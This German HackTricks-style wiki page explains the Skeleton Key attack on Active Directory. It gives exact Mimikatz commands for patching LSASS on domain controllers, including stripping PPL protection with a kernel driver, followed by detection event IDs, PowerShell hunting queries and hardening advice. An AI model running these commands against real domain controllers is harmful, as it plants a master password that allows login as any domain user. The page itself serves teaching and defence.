# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

Der **Skeleton Key attack** ist eine Technik, mit der Angreifer die **Active Directory-Authentifizierung umgehen** können, indem sie ein **Master-Passwort** in den LSASS-Prozess jedes Domain Controllers **injizieren**. Nach der Injektion kann das Master-Passwort (standardmäßig **`mimikatz`**) verwendet werden, um sich als **beliebiger Domain-Benutzer** zu authentifizieren, während dessen echtes Passwort weiterhin funktioniert.<sup>[[1]](#references)[[2]](#references)</sup>

Wichtige Fakten:

- Erfordert **Domain Admin/SYSTEM + SeDebugPrivilege** auf jedem DC und muss **nach jedem Neustart erneut angewendet** werden.<sup>[[2]](#references)</sup>
- Pacht die Validierungspfade von **NTLM** und **Kerberos RC4 (etype 0x17)**; reine AES-Realms oder Konten, die AES erzwingen, **akzeptieren den Skeleton Key nicht**.<sup>[[2]](#references)</sup>
- Kann Konflikte mit Drittanbieter-LSA-Authentifizierungspaketen oder zusätzlichen Smartcard-/MFA-Providern verursachen.<sup>[[2]](#references)</sup>
- Das Mimikatz-Modul akzeptiert den optionalen Schalter `/letaes`, um bei Kompatibilitätsproblemen Änderungen an Kerberos-/AES-Hooks zu vermeiden.<sup>[[3]](#references)</sup>

### Ausführung

Klassisches, nicht durch PPL geschütztes LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Wenn **LSASS als PPL** ausgeführt wird (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), ist ein Kernel-Treiber erforderlich, um den Schutz vor dem Patchen von LSASS zu entfernen:<sup>[[3]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Nach der Injection authentifiziere dich mit einem beliebigen Domänenkonto, verwende jedoch das Passwort `mimikatz` (oder den vom Operator festgelegten Wert). Denke daran, dies in Umgebungen mit mehreren DCs auf **allen DCs** zu wiederholen.

## Mitigations

- **Log monitoring**
- Systemereignis **Event ID 7045** (Installation von Diensten/Treibern) für nicht signierte Treiber wie `mimidrv.sys`.
- **Sysmon**: Event ID 7 (Laden von Treibern) für `mimidrv.sys`; Event ID 10 für verdächtige Zugriffe auf `lsass.exe` durch nicht zum System gehörende Prozesse.
- Sicherheitsereignis **Event ID 4673/4611** für die Verwendung sensibler Berechtigungen oder Anomalien bei der Registrierung von LSA-Authentifizierungspaketen; korreliere dies mit unerwarteten 4624-Anmeldungen unter Verwendung von RC4 (Etype 0x17) von DCs.
- **LSASS härten**
- Lass **RunAsPPL/Credential Guard/Secure LSASS** auf DCs aktiviert, um Angreifer zur Bereitstellung von Kernel-Mode-Treibern zu zwingen (mehr Telemetrie, schwieriger auszunutzen).
- Deaktiviere **RC4** nach Möglichkeit; auf AES beschränkte Kerberos-Tickets verhindern den vom skeleton key verwendeten RC4-Hook-Pfad.<sup>[[2]](#references)</sup>
- Schnelle PowerShell-Suchen:
- Nicht signierte Kernel-Treiberinstallationen erkennen: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Nach dem Mimikatz-Treiber suchen: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Überprüfen, ob PPL nach dem Neustart erzwungen wird: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Weitere Hinweise zur Härtung von Zugangsdaten findest du unter [Windows-Schutzmaßnahmen für Zugangsdaten](../stealing-credentials/credentials-protections.md).

## Referenzen

- [1] [Netwrix – Skeleton Key-Angriff in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Mimikatz-Modul misc::skeleton](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
